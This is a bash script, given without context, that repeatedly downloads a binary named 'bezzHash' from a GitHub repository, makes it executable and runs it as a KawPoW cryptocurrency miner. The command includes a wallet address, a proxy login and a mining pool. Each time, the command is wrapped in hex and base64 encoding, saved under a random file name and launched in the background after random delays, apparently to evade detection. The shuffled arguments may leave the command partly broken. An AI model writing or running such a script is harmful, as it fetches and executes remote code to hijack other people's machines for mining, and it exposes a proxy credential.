#!/bin/bash

# Set the number of iterations
iterations=50

# Start the loop
for ((i=1; i<=$iterations; i++)); do
    # Generate a random UUID for command execution
    random_uuid=$(cat /proc/sys/kernel/random/uuid)

    # Encode the UUID in base64
    base64_encoded_uuid=$(echo -n "$random_uuid" | base64)

    # Write the base64 encoded UUID to a temporary file
    echo "$base64_encoded_uuid" > temp_base64_encoded_uuid.txt

    # Generate a random string for the temporary script filename
    random_script_name=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 10 | head -n 1)

    # Encode the random string in base64
    base64_encoded_script_name=$(echo -n "$random_script_name" | base64)

    # Write the base64 encoded script filename to a temporary file
    echo "$base64_encoded_script_name" > temp_base64_encoded_script_name.txt

    # Randomize the command and parameters
    command="wget"
    options=("https://github.com/Testdrive345/scriptX/raw/main/bezzHash" "&&" "chmod" "777" "bezzHash" "&&" "./bezzHash" "--par=kawpow" "--user" "RLgPffTX9i31sQjiW3xi2hjXZP5jw1w1M3" "--socks=zbcpclbx-rotate:2hicb1nxgc3z@p.webshare.io:80" "--server" "stratum.ravenminer.com" "--port" "3838")
    shuffled_options=$(shuf -e "${options[@]}")
    command+=" $shuffled_options"

    # Convert the command to hexadecimal
    hex_code=$(echo -n "$command" | xxd -p)

    # Encode the hex code in base64
    base64_encoded_command=$(echo "$hex_code" | base64)

    # Write encoded code to a temporary file
    echo "$base64_encoded_command" > temp_base64_encoded_command.txt

    # Add some random characters to the file to make it less predictable
    random_chars=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)
    echo "$random_chars" >> temp_base64_encoded_command.txt

    # Decode the base64 code
    base64_decoded=$(base64 -d temp_base64_encoded_command.txt)

    # Convert decoded code back to hex
    hex_decoded=$(echo -n "$base64_decoded" | xxd -r -p)

    # Write the hex code to a temporary file
    echo "$hex_decoded" > temp_hex_decoded.txt

    # Make the file executable
    chmod +x temp_hex_decoded.txt

    # Rename the temporary script file
    mv temp_hex_decoded.txt "$(cat temp_base64_encoded_script_name.txt)"

    # Execute the script with the random UUID as the script name
    "./$(cat temp_base64_encoded_script_name.txt)" &

    # Clean up temporary files
    rm temp_base64_encoded_uuid.txt temp_base64_encoded_script_name.txt temp_base64_encoded_command.txt

    # Add a random delay before next iteration
    sleep $((RANDOM % 10))  # Random delay between 0 and 9 seconds
done
